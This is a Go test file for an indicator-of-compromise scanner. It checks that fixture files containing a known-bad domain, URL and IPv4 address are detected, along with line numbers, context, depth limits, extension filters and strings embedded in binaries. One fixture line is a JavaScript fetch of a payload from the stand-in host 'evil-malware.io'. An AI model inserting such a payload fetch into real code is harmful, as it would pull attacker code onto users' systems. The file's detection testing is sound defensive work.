package iocscan

import (
	"reflect"
	"testing"
)

// fixtureTree writes a sample working directory with files that DO and DON'T
// reference known-bad indicators, and returns the root.
func fixtureTree(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	// app.js: a known-bad URL on line 2 (context lines 1 & 3 around it).
	writeFile(t, root, "src/app.js",
		"const a = 1\nfetch('http://evil-malware.io/payload')\nconsole.log(a)\n")
	// service.env: a known-bad IPv4.
	writeFile(t, root, "config/service.env",
		"NAME=svc\nENDPOINT=185.100.157.127:8080\n")
	// benign file: a domain NOT in the feed.
	writeFile(t, root, "README.md",
		"Docs live at github.com and example.org\n")
	// too-deep file (excluded at Depth=2): dir 'a' is depth 2.
	writeFile(t, root, "deep/a/secret.txt", "evil-malware.io\n")
	// excluded extension.
	writeFile(t, root, "logs/debug.log", "evil-malware.io\n")
	return root
}

func TestScanFindsTextIOCs(t *testing.T) {
	clk := newClock()
	_, loader := standardLoader(t, t.TempDir(), clk)
	root := fixtureTree(t)

	report, err := Scan(Options{Root: root, Ecosystem: "npm", Loader: loader, ContextLines: 1})
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if report.Host.Hostname == "" && report.Host.OS == "" {
		t.Error("host info not populated")
	}
	if report.IndicatorCount == 0 {
		t.Fatal("indicator count is zero; feeds did not load")
	}
	if !report.Malicious() {
		t.Fatal("expected evidence")
	}

	// URL hit in app.js, line 2, with one context line above and below.
	urlEv := findEvidence(report, "src/app.js", TypeURL, "http://evil-malware.io/payload")
	if urlEv == nil {
		t.Fatalf("missing URL evidence; got %s", evidenceSummary(report))
	}
	if urlEv.LineNumber != 2 {
		t.Errorf("URL line = %d, want 2", urlEv.LineNumber)
	}
	if !reflect.DeepEqual(urlEv.ContextBefore, []string{"const a = 1"}) {
		t.Errorf("ContextBefore = %q, want [const a = 1]", urlEv.ContextBefore)
	}
	if !reflect.DeepEqual(urlEv.ContextAfter, []string{"console.log(a)"}) {
		t.Errorf("ContextAfter = %q, want [console.log(a)]", urlEv.ContextAfter)
	}
	if urlEv.Indicator == nil || urlEv.Indicator.Severity != "critical" {
		t.Errorf("URL indicator metadata not attached: %+v", urlEv.Indicator)
	}

	// The same line also yields a bare-domain hit (provenance kept).
	if findEvidence(report, "src/app.js", TypeDomain, "evil-malware.io") == nil {
		t.Errorf("expected domain evidence from the URL line; got %s", evidenceSummary(report))
	}

	// IPv4 hit in service.env, line 2.
	ipEv := findEvidence(report, "config/service.env", TypeIPv4, "185.100.157.127")
	if ipEv == nil {
		t.Fatalf("missing IPv4 evidence; got %s", evidenceSummary(report))
	}
	if ipEv.LineNumber != 2 {
		t.Errorf("IPv4 line = %d, want 2", ipEv.LineNumber)
	}

	// Benign file produced nothing.
	for _, e := range report.Evidence {
		if e.RelPath == "README.md" {
			t.Errorf("benign README flagged: %+v", e)
		}
	}

	// ToFinding adapts to detect.ClassEvidence.
	f := urlEv.ToFinding()
	if f.Class != "evidence" || f.CWE != "CWE-506" {
		t.Errorf("ToFinding = %+v, want ClassEvidence / CWE-506", f)
	}
}

func TestScanDepthLimit(t *testing.T) {
	clk := newClock()
	_, loader := standardLoader(t, t.TempDir(), clk)
	root := fixtureTree(t)

	// Depth 2 must not descend into deep/a (depth 2).
	report, err := Scan(Options{Root: root, Ecosystem: "npm", Loader: loader, Depth: 2})
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if findEvidence(report, "deep/a/secret.txt", TypeDomain, "evil-malware.io") != nil {
		t.Errorf("deep file scanned despite Depth=2; got %s", evidenceSummary(report))
	}

	// Unlimited depth finds it.
	report2, err := Scan(Options{Root: root, Ecosystem: "npm", Loader: loader, Depth: 0})
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if findEvidence(report2, "deep/a/secret.txt", TypeDomain, "evil-malware.io") == nil {
		t.Errorf("deep file not scanned at unlimited depth; got %s", evidenceSummary(report2))
	}
}

func TestScanExtensionFilters(t *testing.T) {
	clk := newClock()
	_, loader := standardLoader(t, t.TempDir(), clk)
	root := fixtureTree(t)

	// Exclude .log → debug.log skipped.
	rep, err := Scan(Options{Root: root, Ecosystem: "npm", Loader: loader, ExcludeExt: []string{".log"}})
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if findEvidence(rep, "logs/debug.log", TypeDomain, "evil-malware.io") != nil {
		t.Error("excluded .log file was scanned")
	}

	// Include only .env → app.js and others skipped, service.env scanned.
	rep2, err := Scan(Options{Root: root, Ecosystem: "npm", Loader: loader, IncludeExt: []string{".env"}})
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if findEvidence(rep2, "config/service.env", TypeIPv4, "185.100.157.127") == nil {
		t.Error("included .env file was not scanned")
	}
	if findEvidence(rep2, "src/app.js", TypeURL, "http://evil-malware.io/payload") != nil {
		t.Error("non-included .js file was scanned")
	}
}

func TestScanBinaryAnalysis(t *testing.T) {
	clk := newClock()
	_, loader := standardLoader(t, t.TempDir(), clk)
	root := t.TempDir()

	// A fake ELF binary: magic + NUL padding + an embedded known-bad domain.
	blob := append([]byte{0x7f, 'E', 'L', 'F'}, make([]byte, 16)...)
	blob = append(blob, []byte("config: evil-malware.io endpoint")...)
	blob = append(blob, 0x00)
	writeBytes(t, root, "bin/agent", blob)

	// Without BinaryAnalysis the binary is skipped.
	rep, err := Scan(Options{Root: root, Ecosystem: "npm", Loader: loader})
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	if len(rep.Evidence) != 0 {
		t.Fatalf("binary scanned despite BinaryAnalysis=false: %s", evidenceSummary(rep))
	}

	// With BinaryAnalysis the embedded domain is found.
	rep2, err := Scan(Options{Root: root, Ecosystem: "npm", Loader: loader, BinaryAnalysis: true})
	if err != nil {
		t.Fatalf("Scan: %v", err)
	}
	ev := findEvidence(rep2, "bin/agent", TypeDomain, "evil-malware.io")
	if ev == nil {
		t.Fatalf("binary domain not found; got %s", evidenceSummary(rep2))
	}
	if !ev.IsBinary {
		t.Error("binary evidence not marked IsBinary")
	}
	if ev.ByteOffset <= 0 {
		t.Errorf("binary evidence ByteOffset = %d, want > 0", ev.ByteOffset)
	}
}

func TestMatchLine(t *testing.T) {
	set := NewIndicatorSet()
	set.Add(&Indicator{Type: TypeDomain, Value: "evil-malware.io"})
	set.Add(&Indicator{Type: TypeIPv4, Value: "185.100.157.127"})
	set.Add(&Indicator{Type: TypeURL, Value: "http://evil-malware.io/payload"})
	m := NewMatcher(set, 0)

	cases := []struct {
		name string
		line string
		want map[IndicatorType]string // type -> value expected present
	}{
		{"bare domain", "see evil-malware.io today", map[IndicatorType]string{TypeDomain: "evil-malware.io"}},
		{"url and host", "x=http://evil-malware.io/payload", map[IndicatorType]string{TypeURL: "http://evil-malware.io/payload", TypeDomain: "evil-malware.io"}},
		{"ipv4", "host 185.100.157.127 here", map[IndicatorType]string{TypeIPv4: "185.100.157.127"}},
		{"benign domain", "github.com is fine", nil},
		{"benign ip", "127.0.0.1 is fine", nil},
		{"substring guard", "notevil-malware.io.org", nil}, // different FQDN, no exact hit
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := map[IndicatorType]string{}
			for _, lm := range m.matchLine(c.line, false) {
				got[lm.typ] = lm.value
			}
			for typ, val := range c.want {
				if got[typ] != val {
					t.Errorf("line %q: %s = %q, want %q", c.line, typ, got[typ], val)
				}
			}
			if c.want == nil && len(got) != 0 {
				t.Errorf("line %q: expected no matches, got %+v", c.line, got)
			}
		})
	}
}
